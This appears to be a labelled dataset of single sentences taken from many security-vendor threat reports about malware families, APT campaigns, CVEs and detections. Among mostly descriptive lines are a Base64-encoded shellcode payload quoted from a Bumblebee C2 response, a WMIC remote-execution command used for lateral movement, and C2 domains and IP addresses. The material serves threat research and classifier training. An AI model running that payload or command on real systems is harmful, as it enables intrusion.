0	In other attacks, there was evidence that Felismus was installed using a tool known as Starloader (detected by Symantec as Trojan.Starloader).
0	Symantec customers are protected against Sowbug and Symantec has also made efforts to notify identified targets of its operations.
0	Petya is a worm, meaning it has the ability to self-propagate.
0	This simulator is used to hide the fact that disk encryption is occurring.
0	"The ""installation key"" referenced in the ransom note is a randomly generated string that is displayed to the user."
0	Symantec products using definitions version 20170627.009 also detect Petya components as Ransom.Petya.
0	An information disclosure vulnerability exists when Microsoft Office improperly discloses the contents of its memory.
0	More information is available on Symantec's free Security Center portal and to our customers through the DeepSight Threat Management System.
0	The first and most notable example of ICS malware was Stuxnet (W32.Stuxnet) which was designed to attack programmable logic controllers (PLCs) being used in the Iranian uranium enrichment program.
0	Adwind (Backdoor.Adwind) is a cross-platform, multifunctional RAT also known as AlienSpy, Frutas, Unrecom, Sockrat, JSocket, and jRAT.
0	It was first discovered in 2013 and can be used for logging keystrokes, using the webcam, stealing information, downloading potentially malicious files, as well as a host of other nasty activities.
0	"Longhorn tools have embedded capitalized code words, internally referenced as ""groupid"" and ""siteid"", which may be used to identify campaigns and victims."
0	The earliest activity identified by Symantec in this renewed campaign was a malicious email campaign that sent emails disguised as an invitation to a New Year's Eve party to targets in the energy sector in December 2015.
0	"Shortly after visiting specific URLs, a file named ""install_flash_player.exe"" was seen on victim computers, followed shortly by the Trojan.Karagany.Bbackdoor."
0	General top-level data: Facebook account, user, password, device IMEI
0	Make frequent backups of important data
0	However, they added that it remains unclear whether ARM and AMD processors are also affected by the vulnerability.
0	Spectre (CVE-2017-5753 and CVE-2017-5715) has a similar outcome but works in a slightly different way, and exploits a flaw in processor design to trick an application into leaking information stored in memory.
0	PowerShell: Microsoft scripting tool that was used to run commands to download payloads, traverse compromised networks, and carry out reconnaissance.
0	Emotet's network-spreading capabilities mean that computers can become infected without any user interaction.
0	Because of this unique visibility, our analysts were able to trace what actions Seedworm took after they got into a network.
0	The URLs lead to various blogs and it is likely the app is being used to increase web traffic to these sites.
0	All other Processing Codes (with non-blacklisted PANs): Response Code = 00 (Approved)
0	Ransomware's profitability in 2016 led to a crowded market and overpricing of ransom demands, but in 2017 cyber criminals seemed to find the sweet spot that victims are willing to pay.
0	They were part of a new trend we have observed where ransomware is being used by targeted attack groups as a decoy, to cause disruption or, in the case of WannaCry, to try and generate revenue.
0	You can also join Symantec threat experts in your region as they review the findings: Register here for the Americas webinar
0	s5060.win7-update[.]com
0	The second trend is towards attacks on the supply chain, compromising organizations with the goal of then attacking the customers, or even the customers of the customers, of those organizations.
0	My name is [RANDOM NAME] and i'm writing you to tell you that you are super cute from your photos on Facebook.
0	The API on the backend allows a user to find the user account that is associated with a specific light bulb by sending the MAC address of that device.
0	Consider whether the device needs internet connection or the local network is sufficient.
0	Scripting Engine Information Disclosure Vulnerability(CVE-2018-0767) MS Rating: Critical
0	Microsoft SharePoint Cross Site Scripting Elevation of Privilege Vulnerability(CVE-2018-0789) MS Rating: Important
0	Microsoft Color Management Information Disclosure Vulnerability(CVE-2018-0741) MS Rating: Important
0	An elevation of privilege vulnerability exists in the way that the Windows Kernel API enforces permissions.
0	A remote code execution vulnerability exists when the Windows font library improperly handles specially crafted embedded fonts.
0	HTTP.sys Denial of Service Vulnerability(CVE-2018-0956) MS Rating: Important
0	Device Guard Security Feature Bypass Vulnerability(CVE-2018-0966) MS Rating: Important
0	A denial of service vulnerability exists in the way that Windows handles objects in memory.
0	Chakra Scripting Engine Memory Corruption Vulnerability (CVE-2018-8266) MS Rating: Critical
0	Cumulative Security Update for Microsoft Device Guard Code
0	.NET Framework Privilege Escalation Vulnerability(CVE-2018-8202) MS Rating: Important
0	Skype for Business and Lync Security Bypass Vulnerability(CVE-2018-8238) MS Rating: Important
0	A privilege escalation vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server.
0	The specially crafted website could either spoof content or serve as a pivot to chain an attack with other vulnerabilities in web services.
0	Gallmaker is using three primary IP addresses for its C&C infrastructure to communicate with infected devices.
0	Orangeworm's secondary targets include Manufacturing, Information Technology, Agriculture, and Logistics.
0	Given the nature of disguise, it's highly likely that they are sent to the victim using spear-phishing emails.
0	A denial of service (DoS) vulnerability exists when ASP.NET Core fails to properly handle web requests.
0	"A privilege escalation vulnerability exists in Azure Automation ""RunAs account"" runbooks for users with contributor role."
0	A local Privilege Escalation Vulnerability exists in how 'splwow64.exe' handles certain calls.
0	OpenType Font Parsing Remote Code Execution Vulnerability (CVE-2019-1419) MS Rating: Critical
0	A spoofing vulnerability exists when Microsoft Browsers improperly handle browser cookies.
0	A cross-site-scripting (XSS) vulnerability exists when Active Directory Federation Services (ADFS) does not properly sanitize certain error messages.
0	Infrastructure for telecommunication providers being attacked to disrupt services
0	We see the Sodinokibi ransomware deployed on three of the victims that were infected with Cobalt Strike.
0	Email appears to be the initial infection vector used by the group.
0	No further activity was observed until March 4, when a PowerShell command was launched at 6.30pm local time.
0	A successful attack could cripple the victim's network, leading to significant disruption to their operations and a costly clean-up operation.
0	WMIC /NODE:&quot;172.16.140.234&quot; process call create &quot;cmd.exe /c c:\users\public\schtask.bat&quot;
0	Scripts were then used to issue various domain, user discovery, and remote service discovery commands.
0	Use of custom password recovery tools such as GrabFF and other open-source password dumping tools
0	Check Point said Rampant Kitten's surveillance campaign had been ongoing for as long as six years, targeting dissidents and minorities in Iran.
0	Custom Downloader - uses Microsoft infrastructure for its C&C activity
0	This is used to follow various types of shortcuts (local and remote), likely to ensure Noberus can follow these shortcuts and perform encryption.
0	Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.
0	The toolset gathers binaries such as FilePak, FilePakMonitor, ScreenCap, Keyrecord but also a third backdoor called FunnyDream.
0	The dropper contains the x86 and the x64 versions of the PcShare Loader and, depending on the infrastructure on which it was executed, it drops one version or the other.
0	"The loader is a DLL file with the ""wuaueng.dll"" InternalName and the ""rtlmake.dll"" ExportName which, besides the DllMain function, also exports two other functions: cmsot and Embedding."
0	The pattern exhibited by attackers and their lateral movements across the infrastructure show that they knew what types of information to look for and they were skilled at evasion techniques. 
0	The document opened by both employees used three exploit methods for Remote Code Execution in Microsoft Word: CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802. 
0	"The ""swift-fraud[.]com/documents/94563784.doc"" URL was opened from the body of an email received in a spearphishing campaign targeting financial institutions."
0	"It makes use of another file ""tied"" to the user (same hash as in the case of MSWINTAP.DAT) in %PROGRAMDATA%\Microsoft\Windows\Ringtones; we know it writes 11 characters in it, but its exact intention is yet to be discovered"
0	For instance, Bitdefender has a few dozen different DLLs developed by teams spread across multiple development locations. 
0	First, it adds a new registry value to HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Prun that will point to the other component of the second stage, C:\Program Files (x86)\PublicGaming\prun.exe.
0	Fingerprints the system (network topology, processes, files)
0	192[.]52[.]167[.]199
0	"In our telemetry, those files were seen with the name of ""mini.exe"", ""mfevtpse.exe"" or ""mfevtps.exe"". "
0	Then, it spawns an instance of __IntervalTimerInstruction [7] (line 45), sets its timer id to WindowsSystemManager_WMITimer, and sets its interval to 960000 ms. 
0	We had captured several payloads downloaded from the attacker's server when we generated the URLs as the scripts do with the DGA.
0	Another way to abuse legitimate Windows components is running scripts from scrcons.exe, which is responsible for executing event consumer scripts.
0	Dropper applications come with a standard Privacy Policy; these policies have to be hosted somewhere online.
0	The second backdoor, that we call Nebulae, is supposedly used as a measure of precaution to not lose the persistence in case any signs of infections gets detected. 
0	A command simply uploads the system's ARP cache to find the network hosts that were recently contacted.
0	CONH0ST .EXE - The modified XMRig miner user to mine Monero (XMR) on a mining pool. 
0	The components we documented above form the building blocks of the adware framework.
0	The InsertJs, SendMouseMoveBrowser, SendMouseWheel, RandInt, OpenUrl, TopWindowId and Sleep functions are implemented natively and bound to Lua.
0	The File Searcher component will read 2048 bytes from the zip file
0	The Exfiltration component is responsible for running the File Searcher component and for exfiltrating the files to the C&C server through a POST request.
0	This exploit is necessary because, under Windows32-on-Windows64 (WOW64), 32-bit processes have limited access to 64-bit processes such as the system's explorer.exe.
0	system information (Windows version, processor architecture)
0	bot_httpinject_enable {URLs}: these URLs are removed from the injection disable list mentioned above.
0	The data length is stored XORed with a value saved in the persistence structure.
0	RegSetValueEx( HKLM\Software\Microsoft\Windows\hash_string, buffer )
0	March (left) & April (right) - Asia and Australia Evolution of Coronavirus-themed threat reports
0	The malware attempts to spoof known legitimate Turkish healthcare apps that can be currently found on Google Play.
0	The vulnerability occurs in the dtg_get_config.sh script due to improper handling of a user-controlled variable.
0	In addition to the vulnerabilities, the bot can also identify two new types of devices and pass their default username and passwords.
0	ed2ae1f0729ef3a26c98b378b5f83e99741b34550fb5f16d60249405a3f0aa33
0	File-encrypting ransomware Trojans are almost ubiquitous on Windows, and it was only a matter of time until the advent of the first piece targeting Linux.
0	"The web service is set up locally and can be accessed through the ""onion"" address."
0	Since most of the targeted routers seem to involve this particular manufacturer, it's plausible that this is also an attack vector that attackers exploit.
0	The window messages are processed as expected, simulating mouse clicks or key presses on the virtual desktop that was created.
0	lParam (4 bytes), 4 unused / padding bytes, wParam (4 bytes), another 4 unused / padding bytes and then the message (4 bytes) and is decoded in the following way.
0	One way to do this is to continuously send deauthentication messages, so that the device is dropped from the wireless network. 
0	After explorer.exe writes them to disk, msh.exe and msn.exe reside in the \Windows\System32\ folder as hidden files.
0	There are a few small helper functions, like drp, log, rdr, SendPostData, that can be used by the methods thatimplement stealing capabilities.
0	Then it specifically searches for Exodus wallet's seed.seco file and all the files from 'AppDataRoamin\Electrum\wallets.
0	lf thefolder already exists, the function will call Timer1.Start() to notify Timer1 to start handling tick events.
0	Some other arguments are decrypted for use with the requests.
0	The next part plays a key role in the way the attackillchain unfolds.
0	Themshta.exe application cannot explicitly save files to the disk, so the group behind the attack took a smarter approach to circumventthis restriction.
0	Being an atypical, indirect method, it is easily understood that the actions performed through WMI can also be found in the Defense Evasion tactic.
0	The cyber threat landscape is continually evolving, with the attacks becoming ever more sophisticated.
0	What You Should Know About Drive-By Download Attacks - Part 1
0	Botnets have many uses including spamming, phishing, denial-of-service attacks, installing malware, click fraud, stealing confidential data, distributing malware and more.
0	More frequent backups of data stored on Windows XP systems or that Windows XP systems have access to, would be prudent after April.
0	Given that organizations must continue to operate after a breach, it is critical for them to have a plan to minimize the impact of successful attacks on their ongoing operations.
0	The TCP port 9051 is the control port for the legitimate local Tor service and is used to control most of the aspects of a Tor client.
0	Only Syria stands out with substantially higher concentrations of drive-by download sites in the region during 3Q13, 4Q13, and 4Q14.
0	Microsoft Secure and Productive Enterprise
0	"The password to the archive, which is usually ""6666"" in this campaign, is in the email body."
0	Payment site provided is now a single Tor proxy site, compared to three proxy sites in older versions.
0	Figure 6. Another sample spam email from recent Donoff campaign that distributes a new version of Cerber
0	This is how we were able to trace the evolution of Cerber and see the signs that it's not letting up.
0	It has a machine learning capability to help your network administrators block dangerous email threats.
0	Microsoft Threat Intelligence refers to the activity group behind these attacks as TERBIUM, following our internal practice of assigning rogue actors chemical element names.
0	Figure 4. Depriz license key (the same as the one used in 2012 attacks) and its limited validity period
0	This means that achieving arbitrary code execution within a renderer process can give attackers the ability to access other origins.
0	In Windows Defender ATP Creators Update, we have instrumented function calls and built statistical models to detect a broad range of malicious injection techniques used in attacks.
0	A majority of malware that perform this persistence technique modify the necessary registry keys in ways that do not fit the profile of a legitimate program.
0	When XORed with the master key, this last field becomes 0, meaning this packet is the first packet of the payload upload.
0	To protect our customers, we released cloud-delivered protection updates and made updates to our signature definition packages shortly after.
0	It sets up scheduled tasks to shut down the machine after at least 10 minutes past the current time.
0	The attachment is a document file that Microsoft Word opens in Protected View.
0	The ransomware component is a dropper that contains a password-protected .zip archive in its resource section.
0	Although targets are distributed across the globe, majority are located in the United States, particularly in and around Washington, D.C. Other targets are in Europe, Hong Kong, India, and Canada.
0	In the March 6 campaign, Dofoil's C&C communication involves the use of the decentralized Namecoin network infrastructure.
0	Automatic provisioning of application access: Users' access to applications can be automatically provisioned or de-provisioned based on their group memberships, geo-location, and employment status.
0	Office 365's machine learning models detect this behavior, among other signals, to determine that such attachments are malicious and block offending email messages.
0	For exploits: Exploit protection and Attack surface reduction rules are also available on Windows 10 in S mode as a consistent barrier against exploitation.
0	GALLIUM uses a variety of tools to perform reconnaissance and move laterally within a target network.
0	Microsoft Defender ATP endpoint detection and response capabilities detect advanced attacks in real-time and give you the power to respond immediately.
0	Accessible to local admins, this portion of the registry can reveal credentials for domain accounts used to run scheduled tasks and services.
0	Doppelpaymer encrypts various files and displays a ransom note.
0	Ryuk originated as a ransomware payload distributed over email, and but it has since been adopted by human operated ransomware operators.
0	Ryuk operators then use a variety of techniques to steal credentials, including the LaZagne credential theft tool.
0	The ransomware deployment often occurs weeks or even months after the attackers begin activity on a network.
0	Defender for Office 365 detects and blocks malicious Microsoft Access database attachments in email.
0	MedusaLocker, which is possibly deployed via existing Trickbot infections
0	If a server is not running in a least-privilege configuration, credential theft could provide a significant return on investment for an attacker beyond their initial access to email and data.
0	Look for Shadow IT tools that attackers might have installed for persistence, such as non-Microsoft RDP and remote access clients.
0	Microsoft Defender for Endpoint detects implants such as BazaLoader and Cobalt Strike, payloads such as Conti and Ryuk, and subsequent attacker behavior.
0	font: italic bold 0.0px Georgia, serif
0	This word document has a macro with some benign code, likely for deception and to make static analysis more difficult.
0	Example: e5b3792c99251af6a9581cd2e27e5a52b9c39c6d704985c4631a0ea49173793e
0	Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.
0	This tool's activity can be detected by detecting processes created by wmipsrv.exe that terminate with the following string: 1> \\127.0.0.1\admin$\__<timestamp>.<6 digits> 2>&1
0	Primitive versions of the maldocs consisted of unobfuscated versions of the PS1 script, with obfuscations being introduced in newer versions.
0	The flaw, identified as CVE-2021-42392, could allow an adversary to execute remote code on vulnerable systems.
0	Vulnerabilities, regardless of patch status, shake up the landscape
0	A lightweight .NET-based implant to run arbitrary code on the infected system.
0	MXview is designed for users to configure, monitor and diagnose networking devices connected to networks in industrial control system environments.
0	One of the most common techniques we observed was the use of legitimate installers as decoy programs included alongside other malicious components.
0	The malware stores two malicious files — setup_x86.exe and url.vbs — in this same directory.
0	The service.exe mentioned previously is effectively a copy of setup_x86.exe.
0	The executable contains two primary functions — OnStart() and OnTimer() — that facilitate this process.
0	The malicious SCT file is essentially an XML file that contains JavaScript that downloads and executes the Loda binary.
0	The attack phase consists of deploying RAT payloads, such as DcRAT and QuasarRAT, to the victim's endpoint instead of the file recon and infector modules seen previously.
0	The DcRAT payloads have minimal changes to their configuration, with only the C2 server configuration modified.
0	The application contains the final payload in an encrypted format, split between the .NET resources.
0	WarzoneRAT capabilities (snip) as advertised by its authors.
0	Sign up for a free trial of Umbrella here.Cisco Secure Firewall and Meraki MX can detect malicious activity associated with this threat using the AMP engine.
0	IP addresses blocked as Security Category: Command and Control Threat Types: Dropper
0	You can also subscribe to the Beers with Talos podcast here and Talos Takes here (as well as on your favorite podcast app).
0	The most serious vulnerability in this group is CVE-2021-1468, which has a CVSS severity score of 9.8 out of 10.
0	The most serious vulnerability exists in the HTTP protocol stack.
0	Figure 2 shows the attackers' use of HTTrack, a free website copier program, to duplicate a legitimate website to use for their own malicious purposes.
0	Transparent Tribe uses a variety of themes in their lures that evolved over time.
0	This is a classic and clever living-off-the-land binary (LoLBin) tactic that avoids popular credential extraction tools like Mimikatz, which may alert defenders.
0	The C2 server of this first Bisonal variant is young03[.]myfw[.]us (port 8888).
0	CISA, the FBI, and HHS also confirmed this activity targeting the Healthcare and Public Health Sector, releasing a joint advisory on October 28, 2020.
0	Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it.
0	The DLL does this by executing minimal python code using the python27.dll library.
0	A Cisco Talos researcher discovered CVE-2020-0939, an information disclosure vulnerability in Microsoft Media Foundation.
0	Update (March 12, 2020): Microsoft released an out-of-band patch for CVE-2020-0796, a code execution vulnerability SMB client and server for Windows.
0	This month's patches include updates to Microsoft Media Foundation, the GDI+ API and Windows Defender, among others.
0	"The acknowledgment sent to the C2 is always the keyword ""ack""."
0	The usual advice remains — check your sources; if it's too good, it probably is; and don't click on any emails unless you know who sent it.
0	As more workers return to their offices, companies are using tracking apps to monitor employees' health and location.
0	Title: Remote code execution vulnerability in Firefox's SharedWorkerService function
0	An exploitable remote code execution vulnerability exists in the cloud connectivity functionality of the WAGO PFC200.
0	Cisco Talos has observed this adversary leveraging Cobalt Strike to dump credentials using Procdump which is part of the SysInternals Suite from Microsoft.
0	"An evolution of the LuckyCat malware, known as ""ExileRAT,"" is targeting Tibetan users."
0	Microsoft disclosed seven critical vulnerabilities this month, which we will highlight below.
0	"The latest Patch Tuesday discloses 60 vulnerabilities, nine of which are considered ""critical,"" with the rest being deemed ""important."""
0	There is also CVE-2019-1060, a remote code execution vulnerability in Microsoft XML Core Services.
0	AMD ATI Radeon ATIDXX64.DLL shader functionality remote code execution vulnerability (TALOS-2019-0818/CVE-2019-5049)
0	TALOS-2019-0849 relates to TALOS-2019-0900, a denial-of-service vulnerability in the Linux kernel.
0	Atlassian Jira issue attachment name information disclosure vulnerability (TALOS-2019-0837/CVE-2019-14995)
0	By modifying the `dhcpd.conf` file, it is possible to make the DHCP server execute shell commands.
0	GOG Galaxy Games fillProcessInformationForPids information leak vulnerability (TALOS-2018-0726/CVE-2018-4052)
0	YouPHPTube /objects/subscribeNotify.json.php user_id SQL injection vulnerability (TALOS-2019-0909/CVE-2019-5119)
0	Unlike the other vulnerabilities outlined in this blog, an attacker does not need credentials to log in to exploit this bug.
0	"The second HTTP request is hxxp://IP/index.html?id=XX (where ""XX"" is the ID for the infected system)"
0	"August 2016 to March 2017: ""Golden Time"" Campaign"
0	CVE-2018-1028 - Microsoft Office Graphics Remote Code Execution Vulnerability
0	This bug cannot be exploited if the user only opens the file in preview mode.
0	CVE-2018-8333 is an elevation of privilege vulnerability in Filter Management that exists when the program improperly handles objects in memory.
0	The TTPs we observed over the past two months are consistent with the previous activity of the so-called Cobalt Group.
0	One of the other domains we identified as being associated with Remcos was viotto-security[.]net.
0	This was potentially a scan for Oracle WebLogic servers, which listens on TCP port 7001 by default.
0	Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
0	A memory corruption vulnerability exists in the PCX-parsing functionality of Computerinsel Photoline 20.54. 
0	One of the pillars of ICS security, as well as the security of traditional IT networks, is restricting access to network activity.
0	The vulnerability triggers, even on the simplest operations performed on a malformed WIM file.
0	This was confirmed with another related sample when another external server was still listening on TCP 80 but no longer serving the template.
0	The timeline around this particular attack is a little unclear there are a couple of things that have been identified.
0	These are remote code execution in Microsoft Office related to improper handling of objects in memory.
0	An information disclosure vulnerability has been identified in Microsoft Office that could leak a user's private key.
0	Microsoft Uniscribe is a series of services used in the rendering of Unicode characters.
0	CVE-2017-8746 - Device Guard Security Feature Bypass Vulnerability
0	A users who opens a maliciously crafted Publisher document could be exploited, resulting in arbitrary code execution of the attacker's choice in the context of the current user.
0	The executable itself is just over 1.4MB in size, which is rather large for attachments used in email campaigns.
0	Given the severity of the vulnerability and the widely available tools that exploit it, leaving this vulnerability unpatched is unwise.
0	It achieve this by using WMIC.exe, vssadmin.exe and cmd.exe.
0	Potentially, this means that the structure of this malware can be used to deliver and run different malicious payloads.
0	Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat.
0	The malware uses RDTSC to calculate the time-based filename used to store the batch file.
0	The purpose of the dropper is to extract the resource named SBS.
0	The rest of the data is encrypted with the TripleDes using a 24-character key: \x00 to \x17 (i.e. characters 0 to 23).
0	The binary can try also to register itself as a Windows service and it modifies the host file.
0	DropperDinwod is a polymorphic dropper.
0	An exploitable out of bound write vulnerability exists in the 'PPTStyleSheet:PPTStyleSheet' functionality of Apache OpenOffice.
0	Vulnerability Discovered by Claudio Bozzato and another member of Cisco Talos.
0	All major web browsers support rendering of SVG files.
0	During the parsing of SVG files, memset function is executed with a size parameter that can be controlled by attacker.
0	"When configured in active proxy mode, the Zabbix Proxy will send ""proxy config"" requests to the Zabbix server on startup, as well as during regular intervals."
0	The databook functionality of Tablib includes also includes a call to the unsafe API call yaml.load.
0	Talos believe this freeze is due to the 2MB macro file being loaded during the opening of the .pub file.
0	The second stage shellcode is a bit more complex and starts by finding required API functions within ntdll.dll.
0	This bot is the final component and is the one containing the banking trojan functionality.
0	This is a list of file extensions the ransomware will encrypt if found[2].
0	Jexboss will fingerprint the JBoss server and perform a scan to determine if the target is vulnerable to one of the exploits it utilizes.
0	When you think of powerful self-propagating malware, what comes to mind?
0	The main focus of memory forensics is to find evidence of intrusion in physical memory.
0	Qbot exfiltrates data over FTP to a list of servers hardcoded in its config file.
0	Note that the overflowed value is used as size parameter in calloc in lines 2166-2171.
0	This allows for greater accuracy in calculating the time required to process packets for sending.
0	During our testing, Talos tested the following versions of Google Chrome.
0	Initially when Dyre begins executing, it will likely be outside of the user's Temp directory and Windows directory.
0	This is done so that it remains running in memory even if the current user logs off.
0	"The ""OpenKeyFileAndWrite"" routine tries to open the ""key.dat"" file, located in the user's Application Data directory."
0	Users might assume that macport.com is afilliated with the actual macports.org.
0	This may mean the exploit kit is rebuilt for each compromised host, or the r7 jar is dynamically built for each request by PHP.
0	In addition to the risk of fraud to the individuals affected, the consequences for the breached organizations are severe.
0	Commands are implemented in a switch statment where 0x01 dumps various system info and 0x06 starts a shell.
0	Microsoft piloted the program with an advisory release on the Win32K TrueType font parsing engine, related to the Duqu malware (CVE-2011-3402).
0	Although the threat contains a field called group_name, it may not be a good indicator for clustering-related activity: samples with different group_name values have been exhibiting similar behavior, which may indicate a single actor operating many group_names.
0	Bumblebee Analysis
0	Figure 1: Bumblebee ciphered configuration
0	{  "client_id":"3f4aa6d4e02790dea90186c5376c0064",
0	"group_name":"1406r",
0	"sys_version":"Microsoft Windows 10 pro \User name: LUCAS-PC\Domain name: WORKGROUP",
0	"client_version":1}
0	{"response_status":1,"tasks":null}
0	{"response_status": 1,
0	"tasks": [
0	{"task": "shi",
0	"task_data": "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY21kLmV4ZQA=",
0	"file_entry_point": ""}]}
0	Botnet Behavior Analysis
0	This means that if several computers in an organization, accessing the internet with the same public IP were infected, the C2 server will only accept the first one infected.
0	But several weeks ago this feature was abruptly turned off, drastically increasing the number of established connections to infected victims at the expense of whatever this feature was supposed to achieve (possibly it was indicative of a testing phase for the malware, which has now ended).
0	This behavior motivated us to pay special attention to the behavior of Bumblebee in different execution environments.
0	Figure 2: Different Bumblebee samples dropping the same payloads based on their RC4 Keys
0	As part of our ongoing monitoring of various Bumblebee botnets, we have been monitoring differences in behavior based on factors such as type of network or geolocation.
0	104.168.201.219
0	IOCs
0	Bumblebee samples
0	c70413851599bbcd9df3ce34cc356b66d10a5cbb2da97b488c1b68894c60ea69
0	Bumblebee C2 servers
0	82aab01a3776e83695437f63dacda88a7e382af65af4af1306b5dbddbf34f9eb
0	Conclusion
0	Analyzing the behavior of the command and control servers used by Bumblebee operators, we have observed how they have tweaked the way their infection chains behave, sometimes in ways that served to drastically expand the number of active victims and volume of C2 traffic.
0	Figure 4: Bumblebee C2 response with a DIJ command containing a Base64 encoded payload
0	Check Points security products are designed to prevent any cyber attack and protect against threats such as described in this blog
0	Yara Rule
0	Recently, we observed a malware spam campaign leveraging the current COVID-19 situation.
0	The emails were sent from a compromised mailbox using a mailer script.
0	The message contains a link leading to a Word document.
0	The email takes advantage of a COVID-19 test mandate as a pretext to lure the unsuspecting user into clicking the link and downloading the document.
